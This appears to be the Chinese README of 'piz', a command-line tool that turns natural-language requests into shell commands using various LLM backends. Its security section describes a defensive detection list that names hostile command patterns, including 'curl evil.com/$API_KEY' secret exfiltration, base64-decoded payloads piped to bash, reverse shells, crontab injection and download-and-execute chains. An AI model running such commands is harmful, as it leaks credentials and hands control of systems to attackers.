<h1 align="center">piz</h1>

<p align="center">
  <strong>智能终端命令助手</strong><br>
  用自然语言描述，自动生成 Shell 命令
</p>

<p align="center">
  <a href="https://github.com/AriesOxO/piz/actions"><img src="https://github.com/AriesOxO/piz/workflows/CI/badge.svg" alt="CI"></a>
  <a href="https://github.com/AriesOxO/piz/releases"><img src="https://img.shields.io/github/v/release/AriesOxO/piz" alt="Release"></a>
  <a href="https://github.com/AriesOxO/piz/blob/main/LICENSE"><img src="https://img.shields.io/github/license/AriesOxO/piz" alt="License"></a>
</p>

<p align="center">
  <a href="./README.md">English</a> |
  <a href="./README_ZH.md">简体中文</a>
</p>

---

## piz 是什么？

**piz** 解决一个问题：你知道想做什么，但记不住具体命令。用自然语言描述你的需求，piz 自动翻译成适合当前系统和 Shell 的命令。

```
$ piz 查看磁盘使用情况
  ➜ df -h
  [Y] 执行  [n] 取消  [e] 编辑
```

## 核心功能

- **自然语言转命令** — 描述需求，得到精确命令
- **多 LLM 后端** — 支持 OpenAI、Claude、Gemini、Ollama + 12 个 OpenAI 兼容供应商（DeepSeek、硅基流动、OpenRouter、Moonshot、智谱GLM、百度千帆、阿里DashScope、Mistral、Together、Minimax、字节BytePlus 等）
- **安全加固** — 三层防护：Prompt 层拒绝非命令输入、注入检测（base64 载荷、环境变量泄露、反弹 Shell、curl 配置攻击）、正则危险分级
- **危险命令检测** — 正则 + LLM 双重防护，危险命令强制二次确认，无法跳过
- **命令解释** — `piz -e 'command'` 逐项拆解命令含义
- **命令纠错** — `piz fix` 自动诊断并修复失败命令，支持自动重试（最多 3 次）
- **交互式对话** — `piz chat` 多轮对话模式，支持 `/help`、`/clear`、`/history` 命令和历史持久化
- **多候选命令** — `-n` 参数生成多个命令方案，自主选择最优方案
- **本地缓存** — SQLite 缓存 + TTL 过期 + LRU 淘汰 + 最大条目数限制，重复查询秒返回
- **执行历史** — `piz history` 查看和搜索所有执行过的命令
- **Shell 补全** — 支持 bash、zsh、fish、PowerShell 自动补全
- **管道模式** — `--pipe` 纯命令输出，便于脚本集成
- **多语言界面** — 中文、英文、日文，安全提示信息全面国际化
- **跨平台** — Windows (PowerShell/cmd)、macOS、Linux (bash/zsh/fish)
- **交互式配置** — 首次运行自动引导，内置供应商预设，无需手动编辑配置
- **NO_COLOR 支持** — 尊重 `NO_COLOR` 环境变量
- **API 容错** — 429/5xx 错误自动重试 + 指数退避

## 快速开始

### 安装

**macOS / Linux（一键安装）：**

```bash
curl -fsSL https://raw.githubusercontent.com/AriesOxO/piz/main/install.sh | bash
```

**Windows（PowerShell）：**

```powershell
iwr -useb https://raw.githubusercontent.com/AriesOxO/piz/main/install.ps1 | iex
```

**Cargo（全平台）：**

```bash
cargo install piz
```

**手动下载：**

前往 [Releases](https://github.com/AriesOxO/piz/releases) 下载二进制文件、`.msi`（Windows）或 `.deb`（Debian/Ubuntu）。

| 平台 | 下载格式 |
|------|---------|
| Windows x86_64 | `.msi` `.zip` |
| macOS x86_64 | `.tar.gz` |
| macOS ARM64 (Apple Silicon) | `.tar.gz` |
| Linux x86_64 | `.tar.gz` `.deb` |
| Linux ARM64 | `.tar.gz` |

### 配置

首次运行任何命令，会自动进入交互式配置向导：

```
$ piz 列出文件

  ⚙ piz 配置向导

? 选择语言 / Select language / 言語を選択：中文
? 选择默认 LLM 后端：
  > openai (DeepSeek, SiliconFlow, OpenRouter, ...)
    claude
    gemini (Google)
    ollama (本地)
? 选择 API 供应商：
    OpenAI / DeepSeek / 硅基流动 / OpenRouter / Moonshot
    智谱GLM / 百度千帆 / 阿里DashScope / Mistral / Together
    Minimax / 字节BytePlus / 自定义URL
? API 地址：https://api.siliconflow.cn
? API 密钥：sk-xxxxx
? 模型名称：Qwen/Qwen3-8B
? 安全命令是否自动执行（不弹出确认）？是

  ✔ 配置已保存
```

也可以手动运行：`piz config --init`

## 使用示例

### 自然语言转命令

```bash
piz 查看磁盘使用情况              # → df -h
piz 找出所有大于100M的文件        # → find . -size +100M -type f
piz 压缩src目录                   # → tar -czf src.tar.gz src/
piz 查看3000端口被谁占用          # → lsof -i :3000
piz 统计当前目录代码行数          # → find . -name "*.rs" | xargs wc -l
```

### 多候选模式

```bash
$ piz -n 3 查找大文件
? 选择要执行的命令:
> 1. find . -size +100M -type f — 查找大于 100MB 的文件
  2. du -ah . | sort -rh | head -20 — 显示最大的 20 个文件/目录
  3. ls -lhRS | head -30 — 按大小降序列出文件
```

### 命令解释

```bash
$ piz -e 'awk "{print \$2}" access.log | sort | uniq -c | sort -rn | head -10'
📖 命令解释：

  awk "{print $2}"  — 提取每行第2个字段（通常是URL或IP）
  access.log        — 输入文件
  sort              — 排序（为 uniq 做准备）
  uniq -c           — 去重并统计出现次数
  sort -rn          — 按数字降序排列
  head -10          — 取前10条结果
```

### 命令纠错

```bash
$ npm install
→ EACCES: permission denied...

$ piz fix
🔧 诊断：权限不足，无法写入 node_modules
  - npm install
  + sudo npm install
```

修复命令支持自动重试：如果修复后的命令仍然失败，piz 会继续分析错误并尝试修复，最多 3 轮。

### 交互式对话模式

```bash
$ piz chat
💬 交互模式
输入你的请求，或 'exit'/'quit' 退出。

> 列出所有运行中的 docker 容器
  ➜ docker ps
  [Y] 执行  [n] 取消  [e] 编辑

> 只显示名称
  ➜ docker ps --format '{{.Names}}'
```

对话模式支持特殊命令：
- `/help` — 显示可用命令
- `/clear` — 清除对话历史
- `/history` — 查看对话历史

### 执行历史

```bash
$ piz history                # 查看最近 20 条执行记录
$ piz history docker -l 10   # 搜索含 "docker" 的最近 10 条记录
```

### Shell 补全

```bash
piz completions bash > ~/.bash_completion.d/piz   # Bash
piz completions zsh > ~/.zfunc/_piz                # Zsh
piz completions fish > ~/.config/fish/completions/piz.fish  # Fish
piz completions powershell > piz.ps1               # PowerShell
```

### 管道模式

```bash
# 仅输出命令，无 UI —— 适合脚本集成
piz --pipe 查看所有 rust 文件   # → find . -name "*.rs"
eval $(echo "列出文件" | piz --pipe)  # 直接执行
```

### 配置管理

```bash
piz config --init        # 运行配置向导
piz config --show        # 查看当前配置（API 密钥自动脱敏）
piz config --reset       # 删除配置文件，重新开始
```

### 其他用法

```bash
piz --backend ollama 查看内存     # 临时切换后端
piz --backend gemini 查看CPU      # 使用 Google Gemini
piz --no-cache 查看系统信息       # 跳过缓存
piz --verbose 列出文件            # 调试：显示 Prompt 和 LLM 响应
piz -n 3 列出文件                 # 生成 3 个候选命令
piz clear-cache                   # 清空缓存
piz --version                     # 查看版本
```

## 支持的供应商

### 原生后端

| 后端 | 配置段 | 说明 |
|------|--------|------|
| **OpenAI** | `[openai]` | 同时支持任何 OpenAI 兼容 API（通过 `base_url`） |
| **Claude** | `[claude]` | Anthropic Messages API，支持自定义 `base_url` |
| **Gemini** | `[gemini]` | Google Generative AI 原生 API |
| **Ollama** | `[ollama]` | 本地模型，无需 API key |

### OpenAI 兼容供应商（通过 `[openai]` + 自定义 `base_url`）

<details>
<summary>点击展开全部 12 个供应商</summary>

| 供应商 | base_url | 默认模型 |
|--------|----------|---------|
| OpenAI | `https://api.openai.com` | gpt-4o-mini |
| DeepSeek | `https://api.deepseek.com` | deepseek-chat |
| 硅基流动 | `https://api.siliconflow.cn` | Qwen/Qwen3-8B |
| OpenRouter | `https://openrouter.ai/api/v1` | auto |
| Moonshot/Kimi | `https://api.moonshot.cn` | moonshot-v1-8k |
| 智谱/GLM | `https://open.bigmodel.cn/api/paas/v4` | glm-4-flash |
| 百度千帆 | `https://qianfan.baidubce.com/v2` | deepseek-v3 |
| 阿里DashScope | `https://dashscope.aliyuncs.com/compatible-mode/v1` | qwen-plus |
| Mistral | `https://api.mistral.ai/v1` | mistral-small-latest |
| Together | `https://api.together.xyz/v1` | Meta-Llama-3-8B |
| Minimax | `https://api.minimax.io/v1` | MiniMax-M1 |
| 字节BytePlus | `https://api.byteplus.volcengineapi.com/v1` | doubao-1.5-pro-32k |

</details>

## 配置文件

路径：`~/.piz/config.toml`

```toml
default_backend = "openai"
cache_ttl_hours = 168          # 缓存有效期（7天）
cache_max_entries = 1000       # 最大缓存条目数（LRU 淘汰）
auto_confirm_safe = true       # 安全命令自动执行
language = "zh"                # 界面语言：zh / en / ja
chat_history_size = 20         # 对话历史最大消息数

[openai]
api_key = "sk-your-key"
model = "gpt-4o-mini"
# base_url = "https://api.openai.com"

# [claude]
# api_key = "sk-ant-xxx"
# model = "claude-sonnet-4-20250514"

# [gemini]
# api_key = "your-gemini-key"
# model = "gemini-2.5-flash"

# [ollama]
# host = "http://localhost:11434"
# model = "llama3"
```

### 常见供应商配置

<details>
<summary>DeepSeek</summary>

```toml
[openai]
api_key = "sk-your-deepseek-key"
model = "deepseek-chat"
base_url = "https://api.deepseek.com"
```
</details>

<details>
<summary>硅基流动 (SiliconFlow)</summary>

```toml
[openai]
api_key = "sk-your-key"
model = "Qwen/Qwen3-8B"
base_url = "https://api.siliconflow.cn"
```
</details>

<details>
<summary>Google Gemini</summary>

```toml
[gemini]
api_key = "your-gemini-key"
model = "gemini-2.5-flash"
```
</details>

<details>
<summary>OpenRouter</summary>

```toml
[openai]
api_key = "sk-or-your-key"
model = "auto"
base_url = "https://openrouter.ai/api/v1"
```
</details>

<details>
<summary>Moonshot / 月之暗面</summary>

```toml
[openai]
api_key = "sk-your-key"
model = "moonshot-v1-8k"
base_url = "https://api.moonshot.cn"
```
</details>

<details>
<summary>智谱 / GLM</summary>

```toml
[openai]
api_key = "your-key"
model = "glm-4-flash"
base_url = "https://open.bigmodel.cn/api/paas/v4"
```
</details>

## 安全机制

piz 实现了三层安全防护：

### 1. Prompt 层拒绝
非命令输入（问候、闲聊、Prompt 注入尝试）会被 LLM 拒绝并返回说明，不会生成可执行命令。

### 2. 注入检测（本地正则，无需 LLM）
命令在执行前会被扫描以下恶意模式：
- 环境变量泄露（`curl evil.com/$API_KEY`）
- 编码载荷（`echo ... | base64 -d | bash`）
- 反弹 Shell（`python -e 'import socket...'`）
- Shell 配置覆写（`> ~/.bashrc`）
- 静默 Crontab 注入（`| crontab -`）
- curl 配置文件攻击（`curl -K malicious.conf`）
- 下载-执行链（`wget ... && chmod +x && ./`）
- 危险的 find/xargs 模式（`find -delete`、`xargs rm`）

命中以上模式的命令会被**直接拦截**，无法执行。注入提示信息已全面国际化（中/英/日）。

缓存命中时也会重新验证注入检测 —— 中毒的缓存条目会被自动清除。

### 3. 危险分级

| 级别 | 行为 | 示例 |
|------|------|------|
| **安全** | 自动执行（如已配置） | `ls`、`df -h`、`git status` |
| **警告** | 弹出确认 | `sudo apt install`、`chmod 755`、`git push` |
| **危险** | 红色警告 + 强制二次确认（无法跳过） | `rm -rf /`、`mkfs`、`DROP TABLE` |

## 项目结构

```
piz/
├── src/
│   ├── main.rs          # 入口，CLI 分发，响应解析，多候选选择
│   ├── cli.rs           # clap 命令行参数定义（含 clap_complete）
│   ├── config.rs        # TOML 配置 + 交互式配置向导（12 个供应商预设）
│   ├── context.rs       # 系统上下文收集（OS、Shell、CWD、架构、Git、包管理器）
│   ├── i18n.rs          # 多语言翻译（中/英/日），含注入检测消息国际化
│   ├── llm/
│   │   ├── mod.rs       # LlmBackend trait + 工厂函数 + 重试/退避工具
│   │   ├── prompt.rs    # Prompt 模板（含安全规则、few-shot 示例、多候选支持）
│   │   ├── openai.rs    # OpenAI 兼容适配器（含重试）
│   │   ├── claude.rs    # Claude 适配器（含重试）
│   │   ├── gemini.rs    # Google Gemini 适配器（含重试）
│   │   └── ollama.rs    # Ollama 适配器（含重试）
│   ├── cache.rs         # SQLite 缓存（SHA256 key + TTL + LRU 淘汰）+ 执行历史
│   ├── danger.rs        # 正则危险检测 + 注入扫描（InjectionReason 枚举）
│   ├── executor.rs      # 用户确认交互 + 命令执行
│   ├── explain.rs       # 命令解释模式
│   ├── fix.rs           # 命令纠错模式 + 自动修复重试循环
│   ├── chat.rs          # 交互式对话模式（斜杠命令 + 历史持久化）
│   ├── history.rs       # Shell 历史记录读取
│   └── ui.rs            # 终端输出格式化（Spinner、Diff、着色）
├── tests/
│   └── integration.rs   # 集成测试
├── install.sh           # macOS/Linux 安装脚本
└── install.ps1          # Windows 安装脚本
```

## 构建

```bash
# 前提：Rust 1.70+
git clone https://github.com/AriesOxO/piz.git
cd piz

cargo build --release      # 构建
cargo test                 # 运行测试（158 个）
cargo install --path .     # 安装到 PATH
```

## 环境变量

| 变量 | 说明 |
|------|------|
| `NO_COLOR` | 设置为任意值可禁用彩色输出 |

## 参与贡献

欢迎贡献！请阅读 [CONTRIBUTING.md](CONTRIBUTING.md) 了解贡献指南。

## 许可证

本项目基于 MIT 许可证开源，详见 [LICENSE](LICENSE)。
